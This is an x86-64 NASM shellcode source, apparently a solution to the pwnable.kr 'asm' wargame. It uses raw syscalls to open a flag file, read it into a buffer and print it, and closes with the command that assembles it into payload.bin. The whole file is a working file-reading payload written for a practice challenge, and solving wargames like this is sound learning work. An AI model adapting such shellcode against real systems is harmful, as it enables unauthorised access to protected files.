; open() returns -1
; syscall for open return negative value


    BITS 64 ; not an instruction, flag to nasm
    ; open
    mov rax, 2 
    lea rdi, [rel flag] ; 0x51 rip + 0x45
    mov rsi, 0
    mov rdx, 0 ; mode isn't used
    syscall

    test rax, rax
    js openError ; sign flag is set(1) negative

    jmp opensuccess

openError:
    mov rax, 1          
    mov rdi, 1          ;
    lea rsi, [rel errormsg]
    mov rdx, errorlen
    syscall

    jmp EXIT

opensuccess:
    push rax
    mov rax, 1          
    mov rdi, 1          ;
    lea rsi, [rel opens]
    mov rdx, openlen
    syscall

    jmp read

readError:
    mov rax, 1
    mov rdi, 1
    lea rsi, [rel readmsg]
    mov rdx, readlen
    syscall

    jmp EXIT

read:
    pop rax
    mov rdi, rax
    xor rax, rax
    lea rsi, [rel buffer]
    mov rdx, 100
    syscall

    test rax, rax
    js readError

    ; RAX = number of bytes read
    mov rdx, rax
    mov rax, 1
    mov rdi, 1
    lea rsi, [rel buffer]
    syscall

    jmp EXIT

EXIT:
    ret

flag: db "./this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong", 0
buffer: resb 100
errormsg: db "Open Failed", 10
errorlen equ $ - errormsg
readmsg: db "Read failed", 10
readlen equ $ - readmsg
bytes: db "bytes read: ", 10
opens: db "Successfuly opened flag", 10
openlen equ $ - opens

; nasm -f bin payload.asm -o payload.bin